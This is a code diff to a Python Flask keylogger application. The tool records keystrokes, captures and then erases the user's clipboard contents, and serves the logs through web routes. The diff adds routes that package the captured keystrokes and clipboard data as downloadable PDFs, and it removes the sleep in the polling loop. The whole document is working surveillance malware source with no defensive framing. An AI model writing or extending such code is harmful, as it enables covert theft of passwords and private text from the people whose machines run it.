@@ -1,10 +1,12 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, Response
 import threading
 import keyboard
 import signal
 import sys
 import pyperclip
-import time
+from io import BytesIO
+from reportlab.lib.pagesizes import letter
+from reportlab.pdfgen import canvas
 
 app = Flask(__name__)
 
@@ -39,15 +41,16 @@ class Keylogger:
             if new_clipboard_content != prev_clipboard_content:
                 self.clipboard_content.append(new_clipboard_content)
                 prev_clipboard_content = new_clipboard_content
-                # Clear the clipboard content
-                pyperclip.copy('')
-            # Sleep for a short duration to avoid excessive CPU usage
-            time.sleep(0.1)
-
-
+                pyperclip.copy('')  # Clear clipboard content
 
     def clear_keystrokes(self):
         self.keystrokes = []
+
+    def get_clipboard_content(self):
+        return self.clipboard_content
+    
+    def get_keystrokes(self):
+        return self.keystrokes
 
 # Create an instance of the Keylogger class
 keylogger = Keylogger()
@@ -84,12 +87,40 @@ def logged_keystrokes():
 # Route to display clipboard content
 @app.route('/clipboard_content')
 def clipboard_content():
-    clipboard_content = keylogger.clipboard_content
+    clipboard_content = keylogger.get_clipboard_content()
     return render_template('clipboard.html', title='Clipboard Content', clipboard_content=clipboard_content)
+
+# Route to generate and download PDF containing clipboard content
+@app.route('/download_pdf')
+def download_pdf():
+    clipboard_content = keylogger.get_clipboard_content()
+    pdf = generate_pdf(clipboard_content)
+    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=clipboard_content.pdf'})
+
+
+@app.route('/download_logs_as_pdf')
+def download_logs():
+    logs_content = keylogger.get_keystrokes()
+    pdf = generate_pdf(logs_content)
+    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=logs_content.pdf'})
+
+    
+
+# Function to generate PDF document
+def generate_pdf(content):
+    buffer = BytesIO()
+    c = canvas.Canvas(buffer, pagesize=letter)
+    y = 750
+    for item in content:
+        c.drawString(50, y, item)
+        y -= 20
+    c.save()
+    pdf = buffer.getvalue()
+    buffer.close()
+    return pdf
 
 if __name__ == '__main__':
     app.run(debug=True)
-
 
 
 
